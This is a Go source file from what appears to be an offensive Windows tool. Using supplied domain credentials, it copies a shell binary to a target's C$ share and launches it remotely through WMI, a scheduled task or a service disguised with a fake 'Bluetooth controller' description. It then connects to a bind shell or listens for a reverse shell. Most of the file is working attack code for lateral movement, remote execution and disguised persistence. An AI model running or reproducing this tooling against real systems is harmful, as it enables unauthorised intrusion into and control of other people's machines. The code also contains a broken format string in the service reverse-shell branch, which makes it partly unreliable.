package main

import (
	"fmt"
	"golang.org/x/sys/windows"
	"io"
	"log"
	"net"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"
)

const (
	ENABLE_VIRTUAL_TERMINAL_PROCESSING uint32 = 0x0004
	ENABLE_VIRTUAL_TERMINAL_INPUT      uint32 = 0x0200
	ENABLE_PROCESSED_INPUT             uint32 = 0x0001
	ENABLE_LINE_INPUT                  uint32 = 0x0002
	ENABLE_ECHO_INPUT                  uint32 = 0x0004
	ENABLE_WINDOW_INPUT                uint32 = 0x0008
	ENABLE_MOUSE_INPUT                 uint32 = 0x0010
	ENABLE_INSERT_MODE                 uint32 = 0x0020
	ENABLE_QUICK_EDIT_MODE             uint32 = 0x0040
	ENABLE_EXTENDED_FLAGS              uint32 = 0x0080
	ENABLE_AUTO_POSITION               uint32 = 0x0100
	ENABLE_PROCESSED_OUTPUT            uint32 = 0x0001
)

func handleTCP(target, user, pass, domain, name, dropmethod, ip, shell string, runas, reverse bool, port int) {
	// TODO - Abstract this to a helper func to reduce code duplication
	// First, no matter what, we must copy gopipe to the target
	fileName := getRandomString(12)
	if name != "" {
		fileName = name
	}

	settings := &Settings{
		User:        fmt.Sprintf("%s\\%s", domain, user),
		Password:    pass,
		TargetShare: "ADMIN$",
		Target:      target,
	}
	if !EstablishConnection(settings, "C$", true) {
		log.Printf("failed to establish connection to C$ share on %s", settings.Target)
		return
	}
	defer EstablishConnection(settings, "C$", false)
	log.Printf("Successfully connected to C$ share on %s\n", target)

	// Copy gopipe to the target
	targetName := fmt.Sprintf(`Windows\Temp\%s.exe`, fileName)
	targetFile := fmt.Sprintf(`\\%s\C$\%s`, target, targetName)
	log.Printf("Copying gopipe to %s\n", targetFile)
	err := copyFile("", pipebin, targetFile)
	if err != nil {
		log.Printf("Failed to copy file: %v\n", err)
		return
	}

	// Now - if we are doing standard bind - we can start the server and connect to it
	// If we are doing reverse, we need to start client listener and THEN start the server (roughly)
	if dropmethod == "wmi" {
		// Launch the named pipe binary using WMI
		// We will use the same WMI code as before, but we will pass the pipe name as an argument
		// Will always launch in the context of the executing user
		cmd := fmt.Sprintf("cmd.exe /k %s -port %d -shell %s", targetFile, port, shell)
		if reverse {
			cmd = fmt.Sprintf("cmd.exe /k %s -port %d -ip %s -shell %s", targetFile, port, ip, shell)
		}
		err = executeRemoteWMI(target, cmd, "C:\\Windows\\Temp", user, pass, domain)
		if err != nil {
			log.Println(err.Error())
			return
		}
	} else if dropmethod == "task" {
		err = createRemoteScheduledTask(target, name, user, pass, domain, "Bluetooth Controller for Samsung Devices", runas)
		if err != nil {
			log.Printf("Failed to create task: %v\n", err)
			return
		}
		log.Printf("Successfully created task %s at %s \n", name, target)
		cmd := fmt.Sprintf("cmd.exe /k %s -port %d -shell %s", targetFile, port, shell)
		if reverse {
			cmd = fmt.Sprintf("cmd.exe /k %s -port %d -ip %s -shell %s", targetFile, port, ip, shell)
		}
		err = runTask(target, name, user, pass, domain, cmd, runas, true)
		if err != nil {
			if err.Error() != "The service did not respond to the start or control request in a timely fashion." {
				// This does not necessarily mean it didn't start
				log.Println(err.Error())
				return
			}
		}
		// TODO - Check actual task status here
	} else if dropmethod == "service" {
		err := CreateRemoteService(target, name, name, "Bluetooth controller for XAIE", "cmd.exe /c cmd.exe", user, pass, domain, runas)
		if err != nil {
			log.Printf("Failed to create service: %v\n", err)
			return
		}
		log.Printf("Successfully created service %s at %s \n", name, target)
		cmd := fmt.Sprintf("%%COMSPEC%% /c  %s -port %d -shell %s", targetFile, port, shell)
		if reverse {
			cmd = fmt.Sprintf("%%COMSPEC%% /c  %s -port %d -ip %s -shell %s", targetFile, port, shell)
		}
		log.Printf("Starting service %s at %s \n", name, target)
		err = executeRemoteService(target, cmd, user, pass, domain, name)
		if err != nil {
			if err.Error() != "The service did not respond to the start or control request in a timely fashion." {
				// This does not necessarily mean it didn't start
				log.Println(err.Error())
			}
		}
	}

	if !reverse {
		handleConnect(&target, &port)
	} else if reverse {
		handleReverseConnect(&port)
	}

}

func handleReverseConnect(port *int) {
	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", *port))
	if err != nil {
		log.Fatalf("Failed to listen on port %d: %v", *port, err)
	}
	defer listener.Close()

	// Log server start
	log.Printf("Reverse Shell Client listening on port %d...\n", *port)

	// Accept the connection
	conn, err := listener.Accept()
	if err != nil {
		log.Fatalf("Error accepting connection: %v", err)
	}

	// Get remote address
	remoteAddr := conn.RemoteAddr().String()
	log.Printf("Shell server connected from %s", remoteAddr)

	// Set up console for terminal interaction
	inHandle, outHandle, origInMode, origOutMode := saveConsoleSettings()
	configureConsole(inHandle, outHandle)
	defer restoreConsole(inHandle, outHandle, origInMode, origOutMode)

	// Handle signals for clean exit
	setupSignalHandler(inHandle, outHandle, origInMode, origOutMode)

	// Get initial terminal size and send to server
	w, h, err := getConsoleSize(outHandle)
	if err == nil {
		log.Printf("Initial terminal size: %dx%d", w, h)
		sendTerminalSizeTCP(conn, w, h)
	}

	// Create a done channel for coordination
	done := make(chan struct{})
	var wg sync.WaitGroup
	wg.Add(2)

	// Forward data from server to local stdout
	go func() {
		defer wg.Done()
		buffer := make([]byte, 4096)

		for {
			select {
			case <-done:
				return
			default:
				n, err := conn.Read(buffer)
				if err != nil {
					if err != io.EOF {
						log.Printf("Error reading from server: %v", err)
						fmt.Printf("\nConnection error: %v\n", err)
					} else {
						log.Printf("Server closed connection")
					}
					close(done)
					return
				}

				_, err = os.Stdout.Write(buffer[:n])
				if err != nil {
					log.Printf("Error writing to stdout: %v", err)
					close(done)
					return
				}
			}
		}
	}()

	// Forward data from local stdin to server
	go func() {
		defer wg.Done()

		// Start a goroutine to monitor terminal size changes
		go monitorTerminalSizeTCP(conn, outHandle, done)

		buffer := make([]byte, 4096)
		for {
			select {
			case <-done:
				return
			default:
				n, err := os.Stdin.Read(buffer)
				if err != nil {
					if err != io.EOF {
						log.Printf("Error reading from stdin: %v", err)
					}
					close(done)
					return
				}

				// Check for exit commands
				if n > 0 {
					input := string(buffer[:n])

					// Check for exact matches to quit or exit commands
					if input == "quit\r\n" || input == "exit\r\n" ||
						input == "quit\n" || input == "exit\n" {
						log.Printf("Exit command detected: %q", input)

						// Send special exit sequence to server
						exitSequence := "\x1B_EXIT_SHELL\x1B\\"
						_, err = conn.Write([]byte(exitSequence))
						if err != nil {
							log.Printf("Error sending exit sequence: %v", err)
						}

						// Wait a moment for the server to process
						time.Sleep(100 * time.Millisecond)

						// Restore console and exit
						fmt.Println("\nExiting shell session.")
						restoreConsole(inHandle, outHandle, origInMode, origOutMode)
						os.Exit(0)
					}

					// Also check if the line ends with these commands (for powershell prompt)
					// This catches cases like "PS C:\> exit"
					trimmedInput := strings.TrimSpace(input)
					if strings.HasSuffix(trimmedInput, "quit") || strings.HasSuffix(trimmedInput, "exit") {
						// Only handle if it's likely a command (preceded by space)
						parts := strings.Fields(trimmedInput)
						if len(parts) > 0 && (parts[len(parts)-1] == "quit" || parts[len(parts)-1] == "exit") {
							log.Printf("Exit command detected in input: %q", input)

							// First send the original input to allow the shell to process it naturally
							_, err = conn.Write(buffer[:n])
							if err != nil {
								log.Printf("Error writing to server: %v", err)
								close(done)
								return
							}

							// Then wait briefly and send our special exit sequence
							time.Sleep(100 * time.Millisecond)
							exitSequence := "\x1B_EXIT_SHELL\x1B\\"
							_, err = conn.Write([]byte(exitSequence))
							if err != nil {
								log.Printf("Error sending exit sequence: %v", err)
							}

							// Wait for server response
							time.Sleep(200 * time.Millisecond)

							// Restore console and exit
							fmt.Println("\nExiting shell session.")
							restoreConsole(inHandle, outHandle, origInMode, origOutMode)
							os.Exit(0)
						}
					}
				}

				_, err = conn.Write(buffer[:n])
				if err != nil {
					log.Printf("Error writing to server: %v", err)
					fmt.Printf("\nConnection error: %v\n", err)
					close(done)
					return
				}
			}
		}
	}()

	// Wait for all goroutines to complete
	wg.Wait()
	log.Printf("Client terminating normally")
}

func handleConnect(host *string, port *int) {
	// Only print connection message to stdout
	fmt.Printf("Connecting to %s:%d...", *host, *port)

	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", *host, *port))
	if err != nil {
		// For critical errors, we still write to stdout
		fmt.Printf("\nFailed to connect: %v\n", err)
		log.Fatalf("Failed to connect: %v", err)
		os.Exit(1)
	}
	defer conn.Close()

	// Print success to stdout and log
	log.Printf("Connected to server")

	// Save original console settings
	inHandle, outHandle, origInMode, origOutMode := saveConsoleSettings()

	// Configure console for terminal emulation
	configureConsole(inHandle, outHandle)

	// Make sure to restore console mode on exit
	defer restoreConsole(inHandle, outHandle, origInMode, origOutMode)

	// Handle signals for clean exit
	setupSignalHandler(inHandle, outHandle, origInMode, origOutMode)

	w, h, err := getConsoleSize(outHandle)
	if err == nil {
		log.Printf("Initial terminal size: %dx%d", w, h)
		sendTerminalSizeTCP(conn, w, h)
	}

	// Create a mechanism to coordinate between goroutines
	done := make(chan struct{})
	var wg sync.WaitGroup
	wg.Add(2)

	// Forward data from server to local stdout
	go func() {
		defer wg.Done()
		buffer := make([]byte, 4096)

		for {
			select {
			case <-done:
				return
			default:
				n, err := conn.Read(buffer)
				if err != nil {
					if err != io.EOF {
						log.Printf("Error reading from server: %v", err)
						fmt.Printf("\nConnection error: %v\n", err)
					} else {
						log.Printf("Server closed connection")
					}
					close(done)
					return
				}

				_, err = os.Stdout.Write(buffer[:n])
				if err != nil {
					log.Printf("Error writing to stdout: %v", err)
					close(done)
					return
				}
			}
		}
	}()

	// Forward data from local stdin to server
	go func() {
		defer wg.Done()

		// Start a goroutine to monitor terminal size changes
		go monitorTerminalSizeTCP(conn, outHandle, done)

		buffer := make([]byte, 4096)
		for {
			select {
			case <-done:
				return
			default:
				n, err := os.Stdin.Read(buffer)
				if err != nil {
					if err != io.EOF {
						log.Printf("Error reading from stdin: %v", err)
					}
					close(done)
					return
				}

				// Check for exit commands
				if n > 0 {
					input := string(buffer[:n])

					// Check for exact matches to quit or exit commands
					if input == "quit\r\n" || input == "exit\r\n" ||
						input == "quit\n" || input == "exit\n" {
						log.Printf("Exit command detected: %q", input)

						// Send special exit sequence to server
						exitSequence := "\x1B_EXIT_SHELL\x1B\\"
						_, err = conn.Write([]byte(exitSequence))
						if err != nil {
							log.Printf("Error sending exit sequence: %v", err)
						}

						// Wait a moment for the server to process
						time.Sleep(100 * time.Millisecond)

						// Restore console and exit
						fmt.Println("\nExiting shell session.")
						restoreConsole(inHandle, outHandle, origInMode, origOutMode)
						os.Exit(0)
					}
				}

				_, err = conn.Write(buffer[:n])
				if err != nil {
					log.Printf("Error writing to server: %v", err)
					fmt.Printf("\nConnection error: %v\n", err)
					close(done)
					return
				}
			}
		}
	}()
	wg.Wait()
	log.Printf("Client terminating normally")
}

// Save original console settings
func saveConsoleSettings() (windows.Handle, windows.Handle, uint32, uint32) {
	inHandle, err := windows.GetStdHandle(windows.STD_INPUT_HANDLE)
	if err != nil {
		log.Fatalf("Failed to get stdin handle: %v", err)
	}

	outHandle, err := windows.GetStdHandle(windows.STD_OUTPUT_HANDLE)
	if err != nil {
		log.Fatalf("Failed to get stdout handle: %v", err)
	}

	var inMode, outMode uint32
	if err := windows.GetConsoleMode(inHandle, &inMode); err != nil {
		log.Fatalf("Failed to get console input mode: %v", err)
	}

	if err := windows.GetConsoleMode(outHandle, &outMode); err != nil {
		log.Fatalf("Failed to get console output mode: %v", err)
	}

	log.Printf("Saved original console modes: in=0x%x, out=0x%x", inMode, outMode)
	return inHandle, outHandle, inMode, outMode
}

// Configure console for better terminal support
func configureConsole(inHandle, outHandle windows.Handle) {
	// Set input mode for better interactive experience
	// We want raw input, but also window input for resizing
	rawInMode := ENABLE_VIRTUAL_TERMINAL_INPUT | ENABLE_WINDOW_INPUT
	if err := windows.SetConsoleMode(inHandle, rawInMode); err != nil {
		log.Printf("Warning: Failed to set console input mode: %v", err)
	}

	// Get current output mode
	var outMode uint32
	if err := windows.GetConsoleMode(outHandle, &outMode); err != nil {
		log.Printf("Warning: Failed to get console output mode: %v", err)
	}

	// Set output mode to enable ANSI escape sequences
	newOutMode := outMode | ENABLE_VIRTUAL_TERMINAL_PROCESSING | ENABLE_PROCESSED_OUTPUT
	if err := windows.SetConsoleMode(outHandle, newOutMode); err != nil {
		log.Printf("Warning: Failed to set console output mode: %v", err)
	}

	log.Printf("Console configured for terminal emulation")
}

// Restore original console settings
func restoreConsole(inHandle, outHandle windows.Handle, inMode, outMode uint32) {
	// Clear the screen before restoring (using ANSI escape sequence)
	fmt.Print("\x1b[2J\x1b[H")

	if err := windows.SetConsoleMode(inHandle, inMode); err != nil {
		log.Printf("Warning: Failed to restore console input mode: %v", err)
	}

	if err := windows.SetConsoleMode(outHandle, outMode); err != nil {
		log.Printf("Warning: Failed to restore console output mode: %v", err)
	}

	log.Printf("Console restored to original settings")
}

// Set up handler for Ctrl+C and other signals
func setupSignalHandler(inHandle, outHandle windows.Handle, inMode, outMode uint32) {
	c := make(chan os.Signal, 1)
	signal.Notify(c, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-c
		restoreConsole(inHandle, outHandle, inMode, outMode)
		fmt.Println("\nDisconnected from server")
		os.Exit(0)
	}()
}

// Get console window size
func getConsoleSize(handle windows.Handle) (width, height uint16, err error) {
	var info windows.ConsoleScreenBufferInfo
	err = windows.GetConsoleScreenBufferInfo(handle, &info)
	if err != nil {
		return 0, 0, err
	}

	width = uint16(info.Window.Right - info.Window.Left + 1)
	height = uint16(info.Window.Bottom - info.Window.Top + 1)
	return width, height, nil
}

// Send terminal size to the server
// Uses a simple protocol: ESC_RESIZE=WIDTHxHEIGHTESC\
func sendTerminalSizeTCP(conn net.Conn, width, height uint16) {
	resizeMsg := fmt.Sprintf("\x1B_RESIZE=%dx%d\x1B\\", width, height)
	_, err := conn.Write([]byte(resizeMsg))
	if err != nil {
		log.Printf("Failed to send terminal size: %v", err)
	} else {
		log.Printf("Sent terminal size: %dx%d", width, height)
	}
}

// Monitor terminal size changes and send updates to the server
func monitorTerminalSizeTCP(conn net.Conn, handle windows.Handle, done <-chan struct{}) {
	var lastWidth, lastHeight uint16

	// Get initial size
	width, height, err := getConsoleSize(handle)
	if err == nil {
		lastWidth, lastHeight = width, height
	}

	// Check for size changes every 250ms
	ticker := time.NewTicker(250 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			width, height, err := getConsoleSize(handle)
			if err != nil {
				continue
			}

			// Only send if size has changed
			if width != lastWidth || height != lastHeight {
				sendTerminalSizeTCP(conn, width, height)
				lastWidth, lastHeight = width, height
			}
		case <-done:
			return
		}
	}
}
